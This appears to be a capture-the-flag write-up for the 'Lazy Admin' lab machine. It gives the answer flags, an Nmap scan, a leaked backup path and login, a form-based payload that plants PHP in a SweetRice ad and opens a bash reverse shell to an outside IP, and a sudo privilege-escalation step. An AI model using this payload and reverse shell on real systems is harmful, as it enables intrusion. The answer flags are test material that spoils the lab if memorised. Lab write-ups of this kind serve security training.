# Lazy Admin
##### Question 1:User Flag
Answer
```bash
THM{63e5bce9271952aad1113b6f1ac28a07}
```

##### Question 1:Root Flag
Answer
```bash
THM{6637f41d0177b6f37cb20d775124699f}
```

- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

Nmap Scans:
```bash

Nmap scan report for 10.10.232.168
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works


```

backup via backup disclosure vuln /content/inc/mysql_backup

SweetRice Login
http://host/content/as/

login: manager:Password123

shell
```bash
create new ad with name test with content:

<html>
<body onload="document.exploit.submit();">
<form action="http://10.10.232.168/content/as/?type=ad&mode=save"
method="POST" name="exploit">
<input type="hidden" name="adk" value="hacked"/>
<textarea type="hidden" name="adv">
<?php
echo '<h1> Hacked </h1>';
phpinfo();exec("/bin/bash -c 'bash -i >& /dev/tcp/10.6.32.32/1234 0>&1'");?>


```

```bash

privesc - sudo 

echo "bash revshell" > /etc/copy.sh
sudo /usr/bin/perl /home/itguy/backup.pl


```